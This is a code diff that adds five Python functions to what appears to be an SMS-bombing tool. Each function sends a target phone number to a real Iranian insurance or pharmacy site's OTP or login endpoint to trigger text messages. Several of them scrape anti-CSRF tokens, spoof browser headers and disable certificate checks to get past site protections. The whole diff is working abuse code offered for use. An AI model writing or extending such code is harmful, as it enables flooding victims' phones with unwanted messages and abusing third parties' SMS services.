@@ -70,6 +70,135 @@ def send_service_safe(service, phone):
 # توابع سرویس‌ها
 # ==========================
 
+
+
+def bimesho(phone):
+    try:
+        url = "https://api.bimesho.com/api/v1/auth/otp/send"
+        headers = {
+            'Accept': 'application/json, text/plain, */*',
+            'Content-Type': 'application/json',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
+        }
+        data = {"username": phone.replace('+98', '0')}
+        
+        response = requests.post(url, json=data, headers=headers, timeout=10)
+        
+        print(f"Status: {response.status_code}")
+        print(f"Response: {response.text}")
+        return response.status_code == 200
+
+    except Exception as e:
+        print(f"Error: {e}")
+        return False
+
+
+def ibime(phone):
+    try:
+        url = "https://api.ibime.com/web/v1/account/otp"
+        headers = {
+            'Accept': 'application/json, text/plain, */*',
+            'Content-Type': 'application/json',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
+        }
+        data = {"phoneNumber": phone.replace('+98', '0')}
+        
+        response = requests.post(url, json=data, headers=headers, timeout=10)
+        
+        print(f"Status: {response.status_code}")
+        print(f"Response: {response.text}")
+        return response.status_code == 200
+
+    except Exception as e:
+        print(f"Error: {e}")
+        return False
+
+
+
+def bimeh(phone):
+    try:
+        session = requests.Session()
+        home_url = "https://bimeh.com/"
+        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}
+        
+        # دریافت صفحه اصلی و استخراج توکن
+        html = session.get(home_url, headers=headers, timeout=10, verify=False).text
+        token = None
+        for pattern in [r'Token["\']\s*[:=]\s*["\']([^"\']+)["\']', r'token["\']\s*[:=]\s*["\']([^"\']+)["\']', r'name="token" value="([^"]+)"', r'id="token" value="([^"]+)"']:
+            match = re.search(pattern, html)
+            if match:
+                token = match.group(1)
+                break
+        
+        if not token:
+            print("[-] Token پیدا نشد")
+            return False
+
+        # ارسال درخواست SMS
+        url = "https://coreapi.bimeh.com/v1/authentication"
+        data = {"MobileNumber": phone.replace('+98', '0')}
+        headers.update({'Content-Type': 'application/json', 'Authorization': 'Bearer', 'Token': token, 'Origin': 'https://bimeh.com', 'Referer': home_url})
+        
+        response = session.post(url, json=data, headers=headers, timeout=10, verify=False)
+        print(f"Status: {response.status_code}\nResponse: {response.text}")
+        return response.status_code == 200
+
+    except Exception as e:
+        print(f"Error: {e}")
+        return False
+        
+
+
+def snapp_bime(phone, method="sms"):
+    import requests
+    url = "https://order.insurance.snapp.website/accounts/api/login_sec/"
+    phone = phone.replace("+98", "0")  # فرمت صحیح
+    data = {"username": phone, "type": method}
+    headers = {"Content-Type": "application/json", "Accept": "*/*"}
+    try:
+        response = requests.post(url, json=data, headers=headers, timeout=10)
+        if response.status_code == 200:
+            result = response.json()
+            status = result.get("status", {})
+            if status.get("type") == "success" and not status.get("error"):
+                print(f"[+] Snapp Insurance ({method.upper()}): موفق")
+                return True
+            else:
+                print(f"[-] Snapp Insurance ({method.upper()}): پاسخ نامعتبر: {result}")
+                return False
+        else:
+            print(f"[-] Snapp Insurance ({method.upper()}): خطای سرور {response.status_code}")
+            return False
+    except Exception as e:
+        print(f"[!] خطا در Snapp Insurance ({method.upper()}): {e}")
+        return False
+
+
+
+def darunet(phone):
+    try:
+        session = requests.Session()
+        login_url = "https://darunet.com/my-account/"
+        headers = {'User-Agent': 'Mozilla/5.0'}
+        response = session.get(login_url, headers=headers, timeout=10, verify=False)
+        soup = BeautifulSoup(response.text, 'html.parser')
+        security_token = None
+        for script in soup.find_all('script'):
+            if script.string:
+                match = re.search(r'security["\']\s*[:=]\s*["\']([^"\']+)["\']', script.string)
+                if match:
+                    security_token = match.group(1)
+                    break
+        if not security_token: return False
+        data = {'action':'voorodak__submit-username','username':phone.replace('+98','0'),'security':security_token}
+        headers.update({'Content-Type':'application/x-www-form-urlencoded','X-Requested-With':'XMLHttpRequest','Origin':'https://darunet.com','Referer':login_url})
+        resp = session.post("https://darunet.com/wp-admin/admin-ajax.php", data=data, headers=headers, timeout=10, verify=False)
+        return resp.status_code == 200 and 'success' in resp.text.lower()
+    except:
+        return False
+        
+        
+        
 def padmira(phone):  
     phone = phone.strip()
     if phone.startswith("+98"): phone = "0" + phone[3:]
